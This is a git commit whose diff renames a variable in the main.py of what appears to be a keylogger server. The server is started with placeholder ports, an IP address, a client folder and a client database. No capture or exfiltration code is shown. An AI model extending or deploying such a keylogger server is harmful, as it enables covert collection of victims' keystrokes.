f0209b16c12f88830eb721b487d0e5f3c46e67b7
8itwise <supremebigboy@gmail.com>
2024-04-07 07:22:16 +0100

    minor tweak

--- Server/main.py
+++ Server/main.py
@@ -2,6 +2,6 @@ from keylogger_server import KeyloggerServer
 
 
 
-call = KeyloggerServer("PORT-1", "PORT-2", "IP_Address", "ClientFolder", "clientDatabase.db")
-call.start()
+rm_logger = KeyloggerServer("PORT-1", "PORT-2", "IP_Address", "ClientFolder", "clientDatabase.db")
+rm_logger.start()
 
